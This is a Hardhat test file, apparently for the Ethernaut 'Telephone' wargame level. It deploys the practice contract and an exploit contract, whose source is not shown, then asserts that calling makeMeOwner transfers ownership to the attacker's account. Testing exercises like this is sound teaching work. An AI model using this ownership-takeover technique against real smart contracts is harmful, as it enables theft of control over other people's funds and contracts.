import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Telephone", function () {
  it("Should make caller owner", async function () {

    const [deployer] = await ethers.getSigners();
    const TelephoneFactory = await ethers.getContractFactory("Telephone");
    const telephone = await TelephoneFactory.deploy();
    await telephone.deployed();
    
    console.log('telephone deployed at:'+ telephone.address);

    const TelephoneExpolitFactory = await ethers.getContractFactory("TelephoneExpolit");
    const telephoneExpolit = await TelephoneExpolitFactory.deploy();
    await telephoneExpolit.deployed();

    await telephoneExpolit.deployed();

    console.log('Exploit deployed at:'+ telephoneExpolit.address);

    await telephoneExpolit.makeMeOwner(telephone.address);

  	expect(
	  	await telephone.owner()
	  ).to.equal(deployer.address)
    
  });
});
